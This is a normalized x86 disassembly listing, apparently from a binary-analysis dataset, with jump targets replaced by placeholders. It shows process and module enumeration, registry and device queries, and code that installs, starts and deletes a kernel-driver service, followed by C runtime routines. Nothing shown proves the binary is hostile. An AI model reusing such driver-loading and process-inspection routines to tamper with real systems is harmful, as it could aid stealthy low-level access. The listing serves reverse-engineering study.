lea eax [ esp + 0x4 ]
push eax
push esi
mov [ esp + 0xc ] 0x22c
call Process32FirstW
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
cmp edi [ esp + 0xc ]
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x230 ]
mov eax [ esp + 0x1c ]
pop esi
xor ecx esp
call sub_200b53e
add esp 0x230
retn
lea ecx [ esp + 0x4 ]
push ecx
push esi
call Process32NextW
test eax eax
jne r-xdata
sub_2008f60
sub esp 0x35c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x358 ] eax
mov eax [ esp + 0x360 ]
push ebx
push 0x0
push 0x2
mov [ esp + 0x14 ] eax
call CreateToolhelp32Snapshot
mov ebx eax
mov [ esp + 0x8 ] ebx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov ecx [ esp + 0x358 ]
xor ecx esp
call sub_200b53e
add esp 0x35c
retn
lea ecx [ esp + 0x10 ]
push ecx
push ebx
mov [ esp + 0x18 ] 0x128
call Process32First
test eax eax
jne r-xdata
push ebp
push esi
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x370 ]
push edx
push 0x0
push eax
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call Process32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push 0x8
mov [ esp + 0x148 ] 0x224
call CreateToolhelp32Snapshot
mov esi eax
mov [ esp + 0xc ] esi
test esi esi
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x358 ]
xor ecx esp
call sub_200b53e
add esp 0x35c
retn
lea edx [ esp + 0x140 ]
push edx
push esi
call Module32First
test eax eax
je r-xdata
push ebp
call [ CloseHandle@IAT ]
jmp r-xdata
push esi
mov esi [ CloseHandle@IAT ]
call esi
push ebp
call esi
lea ebx [ edi + 0x10 ]
jmp r-xdata
mov eax [ esp + 0x154 ]
mov ecx [ esp + 0x158 ]
lea edx [ esp + 0x260 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0x4 ] ebp
mov [ edi + 0xc ] ecx
mov esi 0x104
mov eax ebx
sub edx ebx
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
test esi esi
jne r-xdata
mov cl [ edx + eax ]
test cl cl
je r-xdata
push edi
mov [ eax ] 0x0
call [ esp + 0x18 ]
test eax eax
jne r-xdata
dec eax
mov [ eax ] cl
inc eax
sub esi 0x1
jne r-xdata
mov esi [ CloseHandle@IAT ]
push ebp
call esi
mov edx [ esp + 0xc ]
push edx
call esi
mov ecx [ esp + 0x364 ]
pop esi
pop ebp
pop ebx
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x35c
retn
cmp [ edi ] eax
je r-xdata
jmp r-xdata
mov esi [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
lea edx [ esp + 0x140 ]
push edx
push eax
call Module32Next
test eax eax
jne r-xdata
sub_2009130
sub esp 0x218
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x214 ] eax
push ebp
mov ebp [ esp + 0x220 ]
push esi
push edi
push 0xe0
lea eax [ esp + 0x40 ]
push 0x0
mov ecx 0x9
mov esi r--data
lea edi [ esp + 0x20 ]
push eax
[ edi ] [ esi ]
call sub_2013580
push 0x103
lea ecx [ esp + 0x12d ]
push 0x0
push ecx
mov [ esp + 0x134 ] 0x0
call sub_2013580
add esp 0x18
push ebx
lea eax [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x1
call sub_2008960
lea edx [ esp + 0xc ]
push edx
push 0x20019
push 0x0
lea eax [ esp + 0x24 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebp
mov ecx [ esp + 0x214 ]
xor ecx esp
call sub_200b53e
add esp 0x218
retn
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x120 ]
push edx
lea eax [ esp + 0x18 ]
push eax
push 0x0
push r--data
push ecx
mov [ esp + 0x2c ] 0x104
call [ RegQueryValueExA@IAT ]
lea edx [ esp + 0x11c ]
push edx
push ebp
call sub_200c43c
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ esp + 0x220 ]
pop edi
pop esi
pop ebp
xor ecx esp
mov eax 0x1
call sub_200b53e
add esp 0x218
retn
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
sub_2009250
sub esp 0x20c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x208 ] eax
push ebx
push esi
xor esi esi
mov ebx ecx
cmp [ esp + 0x218 ] esi
jbe r-xdata
mov ecx [ esp + 0x210 ]
xor eax eax
cmp esi [ esp + 0x218 ]
pop esi
sete al
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x20c
retn
push ebp
mov ebp [ GetWindowsDirectoryA@IAT ]
push edi
jmp r-xdata
lea eax [ ebx + 0x14 ]
push eax
call sub_2009130
add esp 0x4
test eax eax
je r-xdata
pop edi
pop ebp
push 0x104
lea ecx [ esp + 0x14 ]
push ecx
call ebp
push ebx
lea edx [ esp + 0x14 ]
push edx
push r--data
mov ecx 0x104
lea edi [ esp + 0x120 ]
call sub_20089e0
add esp 0xc
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x80000000
mov eax edi
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
inc esi
add ebx 0x118
cmp esi [ esp + 0x220 ]
jb r-xdata
sub_2009320
sub esp 0x154
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x150 ] eax
mov eax [ esp + 0x158 ]
push ebx
push ebp
push esi
push edi
xor esi esi
push 0x12
push esi
push esi
push r--data
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] esi
call [ SetupDiGetClassDevsA@IAT ]
mov ebp [ SetupDiGetDeviceInterfaceDetailA@IAT ]
mov ebx [ SetupDiGetDeviceRegistryPropertyA@IAT ]
mov edi eax
mov [ esp + 0x40 ] 0x1c
mov [ esp + 0x10 ] esi
call [ GetLastError@IAT ]
cmp eax 0x103
je r-xdata
push 0x103
lea eax [ esp + 0x61 ]
push 0x0
push eax
mov [ esp + 0x68 ] 0x0
call sub_2013580
add esp 0xc
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x50 ]
push edx
push edi
call ebp
mov eax [ esp + 0x14 ]
push 0x4
push 0x1000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ SetupDiDestroyDeviceInfoList@IAT ]
mov ecx [ esp + 0x160 ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x154
retn
inc [ esp + 0x10 ]
jmp r-xdata
xor eax eax
mov [ esi ] 0x5
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] eax
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x1c ]
push eax
push esi
lea ecx [ esp + 0x50 ]
push ecx
push edi
mov [ esp + 0x3c ] 0x1c
call ebp
push 0x0
push 0x104
lea edx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push 0x4
lea ecx [ esp + 0x38 ]
push ecx
push edi
call ebx
lea edx [ esp + 0x5c ]
push r--data
push edx
call sub_200c43c
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x40 ]
push ecx
push edx
push r--data
push 0x0
push edi
call [ SetupDiEnumDeviceInterfaces@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x104
lea eax [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push 0xc
lea edx [ esp + 0x38 ]
push edx
push edi
call ebx
mov eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
call sub_200c594
add esp 0x8
test eax eax
je r-xdata
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
jmp r-xdata
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x1
sub_20094f0
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x58 ]
push edi
push eax
push r--data
mov ecx 0x50
lea edi [ esp + 0xc ]
call sub_20089e0
add esp 0x8
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
mov eax edi
push eax
call [ CreateFileA@IAT ]
pop edi
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_200b53e
add esp 0x54
retn
or eax eax
sub_2009550
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x8 ]
push ebp
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push 0x1
push 0x3
push 0x1
push 0xf01ff
push ebx
push ebx
push edi
call [ CreateServiceA@IAT ]
mov ebp [ GetLastError@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
jne r-xdata
call ebp
cmp eax 0x431
jne r-xdata
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
push esi
call edi
pop esi
pop ebp
mov eax 0x1
pop edi
retn
call ebp
cmp eax 0x420
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop esi
pop ebp
xor eax eax
pop edi
retn
push 0xf01ff
push ebx
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
push esi
call edi
pop esi
pop ebp
xor eax eax
pop edi
retn
sub_2009610
sub esp 0x1c
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x24 ]
push esi
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop esi
mov eax 0x1
pop edi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop esi
xor eax eax
pop edi
add esp 0x1c
retn
sub_2009866
push 0x58
push r--data
call sub_200db54
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_200d916
test eax eax
jne r-xdata
push 0x1c
call sub_20097f6
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_200d3e9
mov [ ebp - 0x4 ] ebx
call sub_200d147
test eax eax
jge r-xdata
push 0x10
call sub_20097f6
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_200d010
mov [ rw-data ] eax
call sub_200cf55
test eax eax
jge r-xdata
push 0x1b
call sub_200b6e7
pop ecx
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_200cccc
test eax eax
jge r-xdata
push 0x8
call sub_200b6e7
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_200daa7
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_200b81e
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_200b6e7
pop ecx
call sub_200cc6d
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_200b6e7
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_200b9fb
mov [ ebp - 0x4 ] edi
jmp sub_20099c6
push eax
call sub_200b9cf
push ecx
push eax
push esi
push __dos_header
call sub_20038d1
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_20099ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_200d753
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_200e804
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_200e028
mov [ esi + 0x4 ] eax
sub_2009a86
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_2009abf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_2009a86
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200f7d9
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200f7d9
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_2009b94
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2009abf
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_2009a86
pop esi
pop ebp
retn
sub_2009be6
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_200fdd2
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_200fbfc
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_2009c7f
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010a89
add esp 0x14
pop ebp
retn
sub_2009c9d
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010a89
add esp 0x14
pop ebp
retn
sub_2009cbc
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010b2e
add esp 0x18
pop ebp
retn
sub_2009cdd
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x1c ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010b2e
add esp 0x18
pop ebp
retn
sub_2009cff
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010c7e
add esp 0x14
pop ebp
retn
sub_2009d1d
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2010c7e
add esp 0x14
pop ebp
retn
sub_2009d98
push 0xc
push r--data
call sub_200db54
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_200db99
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2010f6a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_200fb13
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200fad1
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2009dee
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_2010f9a
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_2009e26
push 0xc
push r--data
call sub_200db54
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
push 0x4
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2011ba9
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2009e6c
sub_2009e75
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_200ca7e
push 0x1e
call sub_200c8ad
push 0xff
call sub_200b73b
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_2009e26
pop ecx
test eax eax
jne r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
pop ebp
retn
inc eax
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
inc esi
pop esi
pop ebp
retn
sub_2009eef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_2011ee9
pop ecx
call sub_200fb13
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_200ca7e
push 0x1e
call sub_200c8ad
push 0xff
call sub_200b73b
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_2009e26
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_200fb13
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_2011ee9
pop ecx
test eax eax
je r-xdata
call sub_200fb13
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_2009fc0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_2011f36
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_200a0c0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_200a1e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_200d753
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
sub_200a2a5
push 0xc
push r--data
call sub_200db54
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_200db99
retn
call sub_2012a54
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_200fb13
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_201278b
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200a35f
mov eax [ ebp - 0x1c ]
call sub_200fb13
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_2012b8c
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_200a380
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200a2a5
add esp 0xc
mov [ edi ] eax
cmp eax esi
je r-xdata
call sub_200fb13
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_200fa90
add esp 0x14
mov eax edi
jmp r-xdata
call sub_200fb13
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_200a3d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
